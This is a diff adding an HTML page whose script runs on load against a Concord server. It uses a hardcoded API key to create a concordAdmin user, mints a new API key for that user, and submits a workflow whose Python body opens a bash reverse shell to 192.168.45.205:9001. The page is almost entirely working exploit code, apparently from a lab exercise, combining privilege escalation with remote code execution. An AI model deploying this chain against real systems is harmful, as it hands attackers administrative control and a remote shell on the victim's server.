@@ -1,0 +1,84 @@
+<html>
+<head>
+<script>
+yml = `
+configuration:
+  dependencies:
+  - "mvn://org.python:jython-standalone:2.7.2"
+
+flows:
+  default:
+  - script: python
+    body: |
+      cmd = "/bin/bash -i >& /dev/tcp/192.168.45.205/9001 0>&1"
+      import subprocess
+      subprocess.call(cmd, shell=True)
+`
+
+let api_key = "auBy4eDWrKWsyhiDp3AQiw";
+let new_user_name = "user_" + (Math.random() + 1).toString(36).substring(4);
+
+// new user
+console.log("Creating new user: " + new_user_name)
+fetch("http://concord:8001/api/v1/user", {
+	headers: {
+		"Authorization": api_key,
+		"Content-Type": "application/json"
+	},
+	body: JSON.stringify({
+		"username": new_user_name,
+		"type": "LOCAL",
+		"roles": ["concordAdmin"]
+	}),
+	method: "POST"
+}).catch((err) => {
+	console.log(err);
+}).then((response) => {
+	return response.text();
+}).then((text) => {
+	return JSON.parse(text)["id"];
+}).then((id) => {
+	// generate API key
+	console.log("New user Id: ", id);
+	fetch("http://concord:8001/api/v1/apikey", {
+		headers: {
+			"Authorization": api_key,
+			"Content-Type": "application/json"
+		},
+		body: JSON.stringify({
+			"username": new_user_name
+		}),
+		method: "POST"
+	}).catch((err) => {
+		console.log(err);
+	}).then((response) => {
+		return response.text();
+	}).then((text) => {
+		return JSON.parse(text)["key"];
+	}).then((key) => {
+		// call process
+		var ymlBlob = new Blob([yml], {type: "application/yml"});
+		var fd = new FormData();
+		fd.append('concord.yml', ymlBlob);
+		console.log("New API key: ", key);
+		fetch("http://concord:8001/api/v1/process", {
+			headers: {
+				"Authorization": key
+			},
+			method: "POST",
+			body: fd
+		}).catch((err) => {
+			console.log(err);
+		}).then((response) => {
+			return response.text();
+		}).then((text) => {
+			console.log(text);
+		})
+	})
+})
+</script>
+</head>
+ 
+<body>
+</body>
+</html>
